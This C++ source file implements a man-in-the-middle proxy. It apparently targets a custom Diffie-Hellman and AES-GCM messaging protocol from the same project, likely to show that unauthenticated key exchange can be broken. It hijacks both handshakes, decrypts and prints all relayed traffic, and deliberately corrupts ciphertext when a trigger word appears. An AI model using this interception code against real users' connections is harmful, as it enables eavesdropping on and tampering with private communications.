#include "protocol.h"
#include "dh.h"
#include "crypto_utils.h"
#include "aes_gcm.h"
#include "base64.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <iostream>
#include <thread>
#include <string>
#include <array>
#include <atomic>

bool send_all(int sock, const std::string& data) {
    size_t total_sent = 0;
    while (total_sent < data.size()) {
        ssize_t sent = send(sock, data.data() + total_sent, data.size() - total_sent, 0);
        if (sent <= 0) return false;
        total_sent += static_cast<size_t>(sent);
    }
    return true;
}

void relay_loop(
    int sock_in, int sock_out,
    const std::array<unsigned char, AES_KEY_SIZE>& key_in,
    const std::array<unsigned char, AES_KEY_SIZE>& key_out,
    const std::string& label,
    std::atomic<bool>& running
) {
    char buffer[BUFFER_SIZE];
    std::string pending;

    while (running) {
        ssize_t bytes = recv(sock_in, buffer, sizeof(buffer), 0);
        if (bytes <= 0) {
            std::cout << "\n[" << label << "] Disconnected.\n";
            running = false;
            break;
        }

        pending.append(buffer, bytes);

        while (true) {
            size_t nl = pending.find('\n');
            if (nl == std::string::npos) break;

            std::string raw_line = pending.substr(0, nl);
            pending.erase(0, nl + 1);

            try {
                // Decrypt using the sender's key
                std::string plaintext = decrypt_message(key_in, base64_decode(raw_line));
                
                // Log the intercepted plaintext to the terminal
                std::cout << "[MITM INTERCEPT - " << label << "] " << plaintext << "\n";

                // Re-encrypt using the receiver's key
                std::string new_blob = encrypt_message(key_out, plaintext);

                // Tamper with the ciphertext if the plaintext contains a specific trigger
                // If the user types a message containing "TRIGGER_TAMPER", flip a bit.
                if (plaintext.find("TRIGGER_TAMPER") != std::string::npos) {
                    std::cout << "[MITM] Tampering with ciphertext bit...\n";
                    new_blob[12] ^= 0x01; // Corrupt first byte of ciphertext (after 12-byte nonce)
                }

                // Forward the frame
                std::string b64 = base64_encode(new_blob) + "\n";
                send_all(sock_out, b64);

            } catch (const std::exception& e) {
                std::cerr << "[" << label << "] Relay error: " << e.what() << "\n";
                running = false;
                break;
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <real_server_ip> <real_server_port>\n";
        return 1;
    }

    std::string real_ip = argv[1];
    int real_port = std::stoi(argv[2]);
    int proxy_port = 5001; // The port the client will connect to

    // 1. Setup Proxy Listener
    int proxy_server_sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(proxy_server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    sockaddr_in proxy_addr{};
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_addr.s_addr = INADDR_ANY;
    proxy_addr.sin_port = htons(proxy_port);
    
    bind(proxy_server_sock, (sockaddr*)&proxy_addr, sizeof(proxy_addr));
    listen(proxy_server_sock, 1);
    
    std::cout << "[MITM] Listening on port " << proxy_port << "...\n";
    int client_sock = accept(proxy_server_sock, nullptr, nullptr);
    std::cout << "[MITM] Client connected.\n";

    // 2. Connect to Real Server
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(real_port);
    inet_pton(AF_INET, real_ip.c_str(), &server_addr.sin_addr);
    
    if (connect(server_sock, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        std::cerr << "[MITM] Failed to connect to real server.\n";
        return 1;
    }
    std::cout << "[MITM] Connected to real server.\n";

    // 3. Hijack Client Handshake
    char buf[BUFFER_SIZE];
    recv(client_sock, buf, sizeof(buf), 0); // Reads client DH_INIT
    std::string client_init(buf);
    std::string client_pub = client_init.substr(8, client_init.find('\n') - 8);
    
    DiffieHellman dh_proxy_client;
    dh_proxy_client.generate_keypair();
    std::string proxy_client_ack = "DH_ACK " + dh_proxy_client.get_public_value_hex() + "\n";
    send_all(client_sock, proxy_client_ack);
    
    std::string secret_client = dh_proxy_client.compute_shared_secret(client_pub);
    auto key_client = derive_key(secret_client);

    // 4. Hijack Server Handshake
    DiffieHellman dh_proxy_server;
    dh_proxy_server.generate_keypair();
    std::string proxy_server_init = "DH_INIT " + dh_proxy_server.get_public_value_hex() + "\n";
    send_all(server_sock, proxy_server_init);
    
    recv(server_sock, buf, sizeof(buf), 0); // Reads server DH_ACK
    std::string server_ack(buf);
    std::string server_pub = server_ack.substr(7, server_ack.find('\n') - 7);
    
    std::string secret_server = dh_proxy_server.compute_shared_secret(server_pub);
    auto key_server = derive_key(secret_server);

    std::cout << "[MITM] Handshakes hijacked successfully. Relaying plaintext...\n";

    // 5. Start bidirectional relay
    std::atomic<bool> running(true);
    std::thread t1(relay_loop, client_sock, server_sock, key_client, key_server, "C->S", std::ref(running));
    std::thread t2(relay_loop, server_sock, client_sock, key_server, key_client, "S->C", std::ref(running));

    t1.join();
    t2.join();
    
    close(client_sock);
    close(server_sock);
    close(proxy_server_sock);
    return 0;
}